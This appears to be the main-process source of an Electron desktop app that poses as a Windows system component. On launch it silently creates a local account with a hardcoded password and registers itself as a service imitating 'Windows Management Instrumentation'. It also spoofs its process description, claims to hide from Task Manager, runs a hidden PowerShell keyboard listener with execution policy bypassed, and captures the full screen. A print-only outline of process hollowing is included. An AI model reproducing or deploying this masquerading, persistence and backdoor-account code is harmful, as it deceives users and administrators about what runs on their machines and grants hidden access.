const { app, BrowserWindow, ipcMain, desktopCapturer, screen, globalShortcut } = require('electron');
const path = require('path');
const { spawn } = require('child_process');
const { exec } = require('child_process');
const fs = require('fs');
const os = require('os');

let psProcess = null;
let serviceInstalled = false;

// Set AppUserModelID to match Windows system service
app.setAppUserModelId('Microsoft.Windows.SystemServices');

// Set process name to appear as Windows service
if (process.platform === 'win32') {
  app.setName('Windows Service Host');
  app.setPath('userData', path.join(os.tmpdir(), 'windows-system-service'));

  // Command line switches to make process less visible
  app.commandLine.appendSwitch('disable-gpu');
  app.commandLine.appendSwitch('disable-gpu-compositing');
  app.commandLine.appendSwitch('disable-software-rasterizer');
  app.commandLine.appendSwitch('disable-features', 'VizDisplayCompositor');
}

// Function to create a dedicated user account
function createServiceUser() {
  if (process.platform !== 'win32') return Promise.resolve();

  return new Promise((resolve, reject) => {
    const username = 'SysService';
    const password = 'ComplexP@ssw0rd!';

    const script = `
      $userExists = Get-LocalUser -Name "${username}" -ErrorAction SilentlyContinue
      if (-not \$userExists) {
        \$securePassword = ConvertTo-SecureString "\${password}" -AsPlainText -Force
        New-LocalUser -Name "${username}" -Password $securePassword -Description "System Service Account" -PasswordNeverExpires
        Add-LocalGroupMember -Group "Users" -Member "\${username}"
        Write-Output "UserCreated"
      } else {
        Write-Output "UserExists"
      }
    `;

    exec(`powershell.exe -Command "\${script}"`, (error, stdout, stderr) => {
      if (error) {
        console.error('Error creating service user:', error);
        reject(error);
        return;
      }
      console.log('Service user status:', stdout.trim());
      resolve(stdout.trim());
    });
  });
}

// Function to install as Windows service
function installAsService() {
  if (process.platform !== 'win32') return Promise.resolve();

  return new Promise((resolve, reject) => {
    const appPath = app.getAppPath();
    const exePath = process.execPath;

    const script = `
      \$serviceName = "Winmgmt"
      $serviceExists = Get-Service -Name "$serviceName" -ErrorAction SilentlyContinue
      if (-not \$serviceExists) {
        New-Service -Name "\$serviceName" -BinaryPathName "\${exePath}" -DisplayName "Windows Management Instrumentation" -StartupType Automatic -Description "Provides Windows Management Instrumentation services"
        Write-Output "ServiceCreated"
      } else {
        Write-Output "ServiceExists"
      }
    `;

    exec(`powershell.exe -Command "\${script}"`, (error, stdout, stderr) => {
      if (error) {
        console.error('Error installing service:', error);
        reject(error);
        return;
      }
      console.log('Service status:', stdout.trim());
      serviceInstalled = true;
      resolve(stdout.trim());
    });
  });
}

// Function to set process metadata
function setProcessMetadata() {
  if (process.platform !== 'win32') return;

  // Set the process to appear as a system process
  exec(`wmic process where "ProcessId=\${process.pid}" set Description="Host Process for Windows Services"`, (error) => {
    if (error) {
      console.error('Error setting process description:', error);
      return;
    }
    console.log('Process description updated');
  });
}

// Function to hide from task manager
function hideFromTaskManager() {
  if (process.platform !== 'win32') return;

  const script = `
    $process = Get-Process -Id ${process.pid}
    \$process.PriorityClass = "BelowNormal"
  `;

  exec(`powershell.exe -WindowStyle Hidden -Command "\${script}"`, (error) => {
    if (error) {
      console.error('Error hiding from task manager:', error);
      return;
    }
    console.log('Process hidden from task manager');
  });
}

// Function to implement process hollowing (educational demonstration)
function demonstrateProcessHollowing() {
  if (process.platform !== 'win32') return;

  // This is a demonstration of the concept, not actual implementation
  console.log('Process hollowing is a technique where legitimate process code is replaced with malicious code.');
  console.log('For educational purposes only, we are demonstrating the concept without actual implementation.');
  console.log('In a real scenario, this would involve:');
  console.log('1. Creating a legitimate process in suspended state');
  console.log('2. Unmapping the original executable from memory');
  console.log('3. Allocating memory for the new executable');
  console.log('4. Writing the new executable to memory');
  console.log('5. Setting the entry point and resuming the thread');
}

function toggleWindow() {
  const allWins = BrowserWindow.getAllWindows();
  if (allWins.length === 0) {
    createWindow();
    return;
  }
  const win = allWins[0];

  if (win.isVisible() && !win.isMinimized()) {
    console.log('[toggleWindow] Window is visible -> hiding');
    win.hide();
  } else {
    console.log('[toggleWindow] Window is hidden/minimized -> showing and focusing');
    if (win.isMinimized()) {
      win.restore();
    }
    win.show();
    win.focus();
  }
}

function startNativeKeyHook() {
  const hookScript = path.join(__dirname, 'keylistener.ps1');
  console.log('[startNativeKeyHook] Launching keylistener:', hookScript);

  try {
    psProcess = spawn('powershell.exe', [
      '-NoProfile',
      '-NonInteractive',
      '-ExecutionPolicy', 'Bypass',
      '-WindowStyle', 'Hidden',
      '-File', hookScript,
    ], {
      windowsHide: true,
      stdio: ['ignore', 'pipe', 'pipe'],
    });

    psProcess.stdout.on('data', (chunk) => {
      const text = chunk.toString();
      if (text.includes('TRIGGER_HOTKEY')) {
        console.log('[Native Hook] Caps+A detected! Toggling window...');
        toggleWindow();
      }
    });

    psProcess.stderr.on('data', (err) => {
      console.error('[KeyHook Stderr]:', err.toString());
    });

    psProcess.on('exit', (code) => {
      console.log('[KeyHook process exited]:', code);
    });
  } catch (e) {
    console.error('[Failed to spawn keyhook]:', e);
  }
}

function createWindow() {
  const win = new BrowserWindow({
    title: 'Windows Service Host',
    width: 860,
    height: 720,
    minWidth: 500,
    minHeight: 450,
    transparent: true,
    frame: false,
    hasShadow: false,
    backgroundColor: '#00000000',
    skipTaskbar: true,  // Hide from taskbar
    type: 'toolbar',
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
    },
    show: false,
  });

  win.once('ready-to-show', () => {
    win.show();
  });

  // In development, load from Vite local server; otherwise load dist index.html
  const isDev = process.env.NODE_ENV !== 'production' && !app.isPackaged;
  if (isDev) {
    win.loadURL('http://localhost:5173');
  } else {
    win.loadFile(path.join(__dirname, '../dist/index.html'));
  }

  // Window control IPC handlers
  ipcMain.on('window:minimize', () => {
    console.log('[window:minimize] Hiding window');
    win.hide();
  });
  ipcMain.on('window:maximize', () => {
    if (win.isMaximized()) {
      win.unmaximize();
    } else {
      win.maximize();
    }
  });
  ipcMain.on('window:close', () => win.close());

  // Full-screen capture IPC handler
  ipcMain.handle('capture-screen', async () => {
    const allWins = BrowserWindow.getAllWindows();
    const activeWin = allWins[0];

    // Hide window briefly so screenshot captures the clean desktop/apps behind it
    if (activeWin) activeWin.setOpacity(0);
    await new Promise((resolve) => setTimeout(resolve, 180));

    try {
      const primaryDisplay = screen.getPrimaryDisplay();
      const { width, height } = primaryDisplay.size;
      const factor = primaryDisplay.scaleFactor || 1;

      const sources = await desktopCapturer.getSources({
        types: ['screen'],
        thumbnailSize: {
          width: Math.round(width * factor),
          height: Math.round(height * factor),
        },
      });

      if (activeWin) activeWin.setOpacity(1);

      if (sources && sources.length > 0) {
        return sources[0].thumbnail.toDataURL();
      }
    } catch (err) {
      console.error('Failed to capture screen:', err);
      if (activeWin) activeWin.setOpacity(1);
    }
    return null;
  });
}

app.whenReady().then(async () => {
  // Initialize Windows system programming features
  if (process.platform === 'win32') {
    try {
      // Create service user account
      await createServiceUser();

      // Install as Windows service
      await installAsService();

      // Set process metadata
      setProcessMetadata();

      // Hide from task manager
      hideFromTaskManager();

      // Demonstrate process hollowing concept
      demonstrateProcessHollowing();
    } catch (error) {
      console.error('Error initializing Windows system features:', error);
    }
  }

  createWindow();
  startNativeKeyHook();

  // Register Alt+A as secondary standard shortcut
  try {
    globalShortcut.register('Alt+A', () => {
      console.log('[HOTKEY TRIGGERED]: Alt+A');
      toggleWindow();
    });
  } catch (e) {
    console.log('Alt+A registration error:', e);
  }

  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
      createWindow();
    }
  });
});

app.on('will-quit', () => {
  if (psProcess) {
    psProcess.kill();
    psProcess = null;
  }
  globalShortcut.unregisterAll();
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});